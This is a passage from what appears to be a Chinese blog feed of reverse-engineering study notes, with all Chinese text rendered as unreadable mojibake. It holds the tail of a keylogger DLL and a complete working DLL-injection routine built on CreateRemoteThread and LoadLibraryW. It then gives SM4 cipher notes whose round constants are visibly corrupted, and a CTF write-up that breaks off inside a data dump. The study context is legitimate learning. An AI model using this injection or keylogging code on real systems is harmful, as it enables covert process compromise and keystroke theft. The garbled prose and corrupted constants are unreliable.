class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±å¯ä»¥åœ¨å›ºå®šä½ç½®ç”Ÿæˆæ–‡ä»¶å†™å…¥æŒ‰é”®äº†ï¼Œä¸Šé¢çš„ä»£ç å‚è€ƒäº†githubä¸Šçš„ä¸€ä¸ªé¡¹ç›®</p><hr><h2 id="DLLæ³¨å…¥">DLLæ³¨å…¥</h2><p>ä»å¤–éƒ¨ä¿ƒä½¿ç›®æ ‡è¿›ç¨‹è°ƒç”¨LoadLibraryçš„APIä½¿å¾—æ‰§è¡ŒDLLMain</p><p>ä¹¦ä¸Šåªå†™äº†ä¸¤ç§æ–¹æ³•ï¼Œä¹‹åæœ‰æœºä¼šè¯•ä¸€è¯•åå°„æ³¨å…¥ï¼Œå¬è¯´æ•ˆæœæ›´å¥½</p><p>ç¬¬ä¸€ç§ï¼š</p><p>è¿œç¨‹çº¿ç¨‹æ³¨å…¥ï¼Œåˆ›å»ºä¸€ä¸ªè¿œç¨‹çº¿ç¨‹ä»£æ›¿åŸæœ¬è¿›ç¨‹æ³¨å…¥è¿›å»ï¼Œ</p><p>å‡½æ•°</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">WINBASEAPI</span></span><br><span class="line"><span class="function">_Ret_maybenull_</span></span><br><span class="line"><span class="function">HANDLE</span></span><br><span class="line"><span class="function">WINAPI</span></span><br><span class="line"><span class="function"><span class="title">CreateRemoteThread</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ HANDLE hProcess,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ SIZE_T dwStackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ LPTHREAD_START_ROUTINE lpStartAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPVOID lpParameter,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ DWORD dwCreationFlags,</span></span></span><br><span class="line"><span class="params"><span class="function">    _Out_opt_ LPDWORD lpThreadId</span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ç¬¬4ä¸ªå‚æ•°ï¼ˆå¦‚æœæ²¡æœ‰ç¬¬äºŒä¸ªå¯é€‰å‚æ•°å°±æ˜¯ç¬¬ä¸‰ä¸ªï¼‰æ˜¯çº¿ç¨‹å›è°ƒå‡½æ•°åœ°å€ï¼Œå½“åˆ›å»ºå¥½çº¿ç¨‹åï¼Œè¿™ä¸ªçº¿ç¨‹å°±ä¼šæ‰§è¡Œè¿™ä¸ªå‡½æ•°ã€‚å…¶æœ€ç»ˆçš„ä¼ å…¥å‚æ•°æ˜¯CreateRemoteThreadçš„ç¬¬5ä¸ªå‚æ•°ï¼Œè¿™é‡Œå®ƒä¸€å®šæ˜¯ä¸€ä¸ªæŒ‡é’ˆï¼Œæ‰€ä»¥å¦‚æœè¦ä¼ å…¥å¤šä¸ªå‚æ•°çš„è¯éœ€è¦ä¸€äº›æ•°æ®ç»“æ„ï¼Œæ¯”å¦‚æ•°ç»„æŒ‡é’ˆæˆ–è€…ç»“æ„ä½“æŒ‡é’ˆã€‚</p><p>ç”±äºä¼ å…¥å‚æ•°æ˜¯ä¸€ä¸ªæŒ‡é’ˆï¼Œè€Œä¸€ä¸ªè¿›ç¨‹åªèƒ½è®¿é—®å®ƒæ‹¥æœ‰çš„å†…å­˜ç©ºé—´ï¼Œæ‰€ä»¥ä¸ºäº†æŠŠdllæˆåŠŸæ³¨å…¥ï¼Œéœ€è¦å…ˆæŠŠå‚æ•°å†™åˆ°ç›®æ ‡è¿›ç¨‹çš„å†…å­˜ä¸­</p><p>å‡½æ•°</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">WINBASEAPI</span><br><span class="line">_Ret_maybenull_</span><br><span class="line">_Post_writable_byte_size_(dwSize)</span><br><span class="line"><span class="function">LPVOID</span></span><br><span class="line"><span class="function">WINAPI</span></span><br><span class="line"><span class="function"><span class="title">VirtualAllocEx</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ HANDLE hProcess,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPVOID lpAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ SIZE_T dwSize,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ DWORD flAllocationType,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ DWORD flProtect</span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br></pre></td></tr></table></figure><p>æ˜¯ç”¨äºåœ¨ç›®æ ‡è¿›ç¨‹å†…ç”³è¯·ç©ºé—´å¹¶è¿”å›å¯¹åº”æŒ‡é’ˆçš„å‡½æ•°</p><p>å‡½æ•°</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">WINBASEAPI</span><br><span class="line">_Success_(<span class="keyword">return</span> != FALSE)</span><br><span class="line"><span class="function">BOOL</span></span><br><span class="line"><span class="function">WINAPI</span></span><br><span class="line"><span class="function"><span class="title">WriteProcessMemory</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ HANDLE hProcess,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ LPVOID lpBaseAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_reads_bytes_(nSize) LPCVOID lpBuffer,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ SIZE_T nSize,</span></span></span><br><span class="line"><span class="params"><span class="function">    _Out_opt_ SIZE_T* lpNumberOfBytesWritten</span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ˜¯å†™å…¥å†…å­˜çš„å‡½æ•°ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯ä¹‹å‰ç”³è¯·åˆ°çš„åœ°å€ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯å†™å…¥çš„å†…å®¹ã€‚</p><p>ç„¶åå°±å¯ä»¥ç›´æ¥ç”¨ç¬¬äºŒä¸ªå‚æ•°å½“å†™å…¥å†…å®¹çš„æŒ‡é’ˆäº†</p><p>injectå‡½æ•°</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">inject</span><span class="params">(DWORD dwPID, LPCTSTR szDllPath)</span> </span>&#123;</span><br><span class="line">HANDLE hProcess = <span class="number">0</span>, hThread = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (!(hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, dwPID)))<span class="comment">//å–å¾—å¯¹åº”PIDå¥æŸ„</span></span><br><span class="line">&#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;open %d failed\n&quot;</span>), dwPID);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">DWORD dwBufSize = (DWORD)(_tcslen(szDllPath) + <span class="number">1</span>) * <span class="built_in">sizeof</span>(TCHAR);</span><br><span class="line">LPVOID pBuf = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, dwBufSize, MEM_COMMIT, PAGE_READWRITE);<span class="comment">//ç”³è¯·å†…å­˜</span></span><br><span class="line"><span class="keyword">if</span> (pBuf == <span class="number">0</span>) &#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;memory alloc failed\n&quot;</span>));</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">WriteProcessMemory</span>(hProcess, pBuf, (LPVOID)szDllPath, dwBufSize, <span class="literal">NULL</span>);<span class="comment">//å†™å…¥åœ°å€</span></span><br><span class="line">HMODULE kernel = <span class="built_in">GetModuleHandle</span>(<span class="string">L&quot;kernel32.dll&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (kernel == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">LPTHREAD_START_ROUTINE pThreadProc = (LPTHREAD_START_ROUTINE)<span class="built_in">GetProcAddress</span>(kernel, <span class="string">&quot;LoadLibraryW&quot;</span>);<span class="comment">//è·å–LodaLibraryåœ°å€</span></span><br><span class="line">hThread = <span class="built_in">CreateRemoteThread</span>(hProcess,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line">pThreadProc,<span class="comment">//çº¿ç¨‹å›è°ƒå‡½æ•°</span></span><br><span class="line">pBuf,<span class="comment">//ä¼ å‚</span></span><br><span class="line"><span class="number">0</span>,</span><br><span class="line"><span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (hThread == <span class="literal">NULL</span>) &#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;create hThread failed\n&quot;</span>));</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread, INFINITE);<span class="comment">//ç­‰å¾…çº¿ç¨‹ç»“æŸ</span></span><br><span class="line"><span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨æµ‹è¯•ä¸­ï¼Œå¾—çŸ¥äº†x86çš„è¿›ç¨‹ï¼Œé‚£ä¹ˆæ³¨å…¥å™¨å’Œdllä¹Ÿè¦æ˜¯x86çš„ï¼Œx64çš„ä¹Ÿä¸€æ ·</p><p>è¿˜æ²¡å­¦DLLå¸è½½QAQ</p>]]></content>
      
      
      <categories>
          
          <category> é€†å‘å·¥ç¨‹æ ¸å¿ƒåŸç† </category>
          
          <category> çŸ¥è¯†é›† </category>
          
          <category> é€†å‘ </category>
          
          <category> æŠ€èƒ½ </category>
          
          <category> DLLæ³¨å…¥ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é€†å‘ </tag>
            
            <tag> å­¦ä¹  </tag>
            
            <tag> windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åŠ å¯†04-SM4</title>
      <link href="/posts/77e5000d.html"/>
      <url>/posts/77e5000d.html</url>
      
        <content type="html"><![CDATA[<p>å¥½è€¶ï¼Œä¸ç”¨ä»‹ç»äº†ï¼Œ</p><p><a href="http://www.gmbz.org.cn/main/viewfile/20180108015408199368.html">æ–‡æ¡£è¿æ¥</a></p><p>æ„Ÿè§‰å’ŒAESåŠ å¯†å·®ä¸å¤š</p><h1>SM4/SMS4</h1><h2 id="æ€§è´¨">æ€§è´¨</h2><p>åˆ†ç»„ç®—æ³•ï¼Œåˆ†ç»„é•¿åº¦ä½128ä½ï¼Œå¯†é’¥é•¿åº¦ä½128ä½</p><h2 id="è¿‡ç¨‹">è¿‡ç¨‹</h2><h3 id="åŠ å¯†">åŠ å¯†</h3><p>32æ¬¡è¿­ä»£</p><p>è¾“å…¥ä¸ºX0åˆ°X4å…±åå…­å­—èŠ‚ï¼Œæ¯ä¸ªXæœ‰4å­—èŠ‚ï¼Œé€šè¿‡è½®å¯†é’¥è¿ç®—ç”ŸæˆX0å¯¹åº”çš„X5â€¦ä»¥æ­¤ç±»æ¨ï¼Œç›´åˆ°ç”Ÿæˆäº†X32,X33,X34,X35</p><p>å…·ä½“æ¥è¯´<br>$$<br>X_{i+4}=F(X_i,X_{i+1},X_{i+2},X_{i+3},rk_i)<br>$$</p><p>å…¶ä¸­Fä¸ºè½®å‡½æ•°ï¼š<br>$$<br>F(X_i,X_{i+1},X_{i+2},X_{i+3},rk_i) = X_0\oplus T(X_{i+1}\oplus X_{i+2}\oplus X_{i+3}\oplus rk_i)<br>$$</p><p>å…¶ä¸­Tä¸ºåˆæˆç½®æ¢ï¼Œ$T(x) = L(\tau)$ï¼Œå…¶ä¸­Læ˜¯çº¿æ€§å˜æ¢ï¼Œ$\tau$æ˜¯éçº¿æ€§å˜æ¢</p><p>å¯¹äº$\tau$,</p><p>æŠŠè¾“å…¥çš„å››ä¸ªå€¼è½¬ä¸ºhexï¼ŒæŸ¥Sç›’ï¼Œå¾—åˆ°ä¸‹ä¸€ä¸ªå€¼</p><p><img src="https://s2.loli.net/2024/06/05/ZCGLwJEIuyHD5VO.png" alt="image-20240605162119411"></p><p>å¾—åˆ°è½¬åŒ–åçš„4ä¸ªå€¼è®°ä¸ºB</p><p>ç»“æœC=<br>$$<br>L(B)=B\oplus(B&lt;&lt;&lt;2)\oplus(B&lt;&lt;&lt;10)\oplus(B&lt;&lt;&lt;18)\oplus(B&lt;&lt;&lt;24)<br>$$<br>&lt;&lt;&lt;æ˜¯32ä½å¾ªç¯å·¦ç§»</p><p>1æ¬¡ååºå˜æ¢</p><p>å°†ç»“æœå˜ä¸ºX35,X34,X33,X32</p><h3 id="å¯†é’¥æ‰©å±•">å¯†é’¥æ‰©å±•</h3><p>FKç³»ç»Ÿå‚æ•°  CKå›ºå®šå‚æ•° MKè¾“å…¥å¯†é’¥ä¸€å…±4ä¸ª</p><p>è½®å¯†é’¥ç”±åŠ å¯†å¯†é’¥ç”Ÿæˆ</p><p>åŠ å¯†å¯†é’¥K0åˆ°K3ç”±$MK_i$å’Œ$FK_i$å¼‚æˆ–å¾—åˆ°</p><p>åé¢çš„åˆ™æ˜¯$rK_i$=<br>$$<br>K_{I+4}=K_i \oplus Tâ€™(K_{i+1} \oplus K_{i+2} \oplus K_{i+3}\oplus CK_i)<br>$$<br>Tâ€™æ˜¯å°†Tçš„çº¿æ€§å˜æ¢Læ¢æˆä¸‹é¢çš„Lâ€˜ï¼š<br>$$<br>Lâ€™(B)=B\oplus(B&lt;&lt;&lt;13)\oplus(B&lt;&lt;&lt;23)<br>$$</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">FK0</span> <span class="operator">=</span> A3B1BAC6</span><br><span class="line"><span class="attribute">FK1</span> <span class="operator">=</span> <span class="number">56</span>AA3350</span><br><span class="line"><span class="attribute">FK2</span> <span class="operator">=</span> <span class="number">677</span>D9197</span><br><span class="line"><span class="attribute">FK3</span> <span class="operator">=</span> B27022DC</span><br></pre></td></tr></table></figure><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CK = [<span class="number">00070E15</span>ï¼Œ1C232A31,383F464D,<span class="number">545B6269</span>ï¼Œ<span class="number">70777E85</span>,8C939AA1,A8AFB6BD,C4CBD2D9E0E7EEF5FC030A11,181F262D,<span class="number">343B4249</span>ï¼Œ<span class="number">50575E65</span>ï¼Œ6C737A81,888F969D,A4ABB2B9ï¼ŒC0C7CED5,DCE3EAF1,F8FF060D,<span class="number">141B2229</span>ï¼Œ<span class="number">30373E45</span>,4C535A61ï¼Œ686F767D<span class="number">.848B9299</span>.A0A7AEB5ï¼ŒIBCC3CAD1,D8DFE6ED,F4FB0209<span class="number">.10171E25</span>,2C333A41,484F565D,<span class="number">646B7279</span>]</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> å¯†ç å­¦ </category>
          
          <category> ç®—æ³• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> åˆ†ç»„ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜è®°å½•ï¼ˆ4ï¼‰</title>
      <link href="/posts/22913c82.html"/>
      <url>/posts/22913c82.html</url>
      
        <content type="html"><![CDATA[<h1>litctf</h1><h2 id="ezpy">ezpy</h2><p>è¿™ä¸ªæ–‡ä»¶ä¸€çœ‹æ˜¯pythonæ‰“åŒ…çš„</p><p>ç„¶åæœ¬èº«è§£åŒ…å¾ˆç®€å•ï¼Œä½†æ˜¯æ‰¾ä¸»å‡½æ•°è°ƒç”¨çš„åº“æ‰¾ä¸åˆ°QAQ</p><p>ä½†æ˜¯exeå¯ä»¥æ‰§è¡Œï¼Œé‚£ä¹ˆè‚¯å®šåº“æ˜¯åœ¨çš„</p><p>æ ¹æ®<a href="https://blog.csdn.net/as604049322/article/details/119834495">Pyinstalleræ‰“åŒ…çš„exeä¹‹ä¸€é”®åç¼–è¯‘pyè„šæœ¬ä¸é˜²åç¼–è¯‘_pyinstalleré˜²æ­¢åç¼–è¯‘-CSDNåšå®¢</a></p><p>æŸ¥æ‰¾èµ„æ–™ï¼Œé€šè¿‡æŠŠPYZ-00.pyzæ‰“å¼€æŸ¥çœ‹å†…å®¹æ‰¾åˆ°æœ€åçš„åº“</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pyi-archive_viewer ezpy.exe</span><br><span class="line">o PYZ-00.pyz</span><br></pre></td></tr></table></figure><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x xxx.<span class="keyword">lib</span></span><br></pre></td></tr></table></figure><p>ç„¶åå°±å’Œæ™®é€šçš„æ“ä½œä¸€æ ·äº†</p><h1>CISCN</h1><h2 id="asm-re">asm_re</h2><p>è¿™ä¸ªæ˜¯armçš„æ±‡ç¼–ï¼Œçœ‹èµ·æ¥æœ‰ç‚¹éš¾QAQ</p><p>å†™è„šæœ¬æŠŠä»£ç è·‘å‡ºæ¥åˆä¸æ˜¯å¾ˆç°å®</p><p>æ‰€ä»¥å°è¯•ä¸¢ç»™aiï¼Œå†™è„šæœ¬è§£</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> prism <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># åŸå§‹æ•°æ®</span></span><br><span class="line">data = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">__const:0000000100003F10 D7                            unk_100003F10 DCB 0xD7                  ; DATA XREF: _main+34â†‘o</span></span><br><span class="line"><span class="string">__const:0000000100003F11 1F                            DCB 0x1F</span></span><br><span class="line"><span class="string">__const:0000000100003F12 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F13 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F14 B7                            DCB 0xB7</span></span><br><span class="line"><span class="string">__const:0000000100003F15 21                            DCB 0x21 ; !</span></span><br><span class="line"><span class="string">__const:0000000100003F16 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F17 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F18 47                            DCB 0x47 ; G</span></span><br><span class="line"><span class="string">__const:0000000100003F19 1E                            DCB 0x1E</span></span><br><span class="line"><span class="string">__const:0000000100003F1A 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F1B 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F1C 27                            DCB 0x27 ; &#x27;</span></span><br><span class="line"><span class="string">__const:0000000100003F1D 20                            DCB 0x20</span></span><br><span class="line"><span class="string">__const:0000000100003F1E 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F1F 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F20 E7                            DCB 0xE7</span></span><br><span class="line"><span class="string">__const:0000000100003F21 26                            DCB 0x26 ; &amp;</span></span><br><span class="line"><span class="string">__const:0000000100003F22 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F23 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F24 D7                            DCB 0xD7</span></span><br><span class="line"><span class="string">__const:0000000100003F25 10                            DCB 0x10</span></span><br><span class="line"><span class="string">__const:0000000100003F26 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F27 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F28 27                            DCB 0x27 ; &#x27;</span></span><br><span class="line"><span class="string">__const:0000000100003F29 11                            DCB 0x11</span></span><br><span class="line"><span class="string">__const:0000000100003F2A 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F2B 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F2C 07                            DCB    7</span></span><br><span class="line"><span class="string">__const:0000000100003F2D 20                            DCB 0x20</span></span><br><span class="line"><span class="string">__const:0000000100003F2E 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F2F 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F30 C7                            DCB 0xC7</span></span><br><span class="line"><span class="string">__const:0000000100003F31 11                            DCB 0x11</span></span><br><span class="line"><span class="string">__const:0000000100003F32 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F33 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F34 47                            DCB 0x47 ; G</span></span><br><span class="line"><span class="string">__const:0000000100003F35 1E                            DCB 0x1E</span></span><br><span class="line"><span class="string">__const:0000000100003F36 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F37 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F38 17                            DCB 0x17</span></span><br><span class="line"><span class="string">__const:0000000100003F39 10                            DCB 0x10</span></span><br><span class="line"><span class="string">__const:0000000100003F3A 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F3B 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F3C 17                            DCB 0x17</span></span><br><span class="line"><span class="string">__const:0000000100003F3D 10                            DCB 0x10</span></span><br><span class="line"><span class="string">__const:0000000100003F3E 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F3F 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F40 F7                            DCB 0xF7</span></span><br><span class="line"><span class="string">__const:0000000100003F41 11                            DCB 0x11</span></span><br><span class="line"><span class="string">__const:0000000100003F42 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F43 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F44 07                            DCB    7</span></span><br><span class="line"><span class="string">__const:0000000100003F45 20                            DCB 0x20</span></span><br><span class="line"><span class="string">__const:0000000100003F46 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F47 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F48 37                            DCB 0x37 ; 7</span></span><br><span class="line"><span class="string">__const:0000000100003F49 10                            DCB 0x10</span></span><br><span class="line"><span class="string">__const:0000000100003F4A 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F4B 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F4C 07                            DCB    7</span></span><br><span class="line"><span class="string">__const:0000000100003F4D 11                            DCB 0x11</span></span><br><span class="line"><span class="string">__const:0000000100003F4E 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F4F 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F50 17                            DCB 0x17</span></span><br><span class="line"><span class="string">__const:0000000100003F51 1F                            DCB 0x1F</span></span><br><span class="line"><span class="string">__const:0000000100003F52 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F53 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F54 D7                            DCB 0xD7</span></span><br><span class="line"><span class="string">__const:0000000100003F55 10                            DCB 0x10</span></span><br><span class="line"><span class="string">__const:0000000100003F56 00                            DCB    0</span></span><br><span class="line"><span class="string">__const:0000000100003F57 00                            DCB    0</span></span><br><span class="line"><span 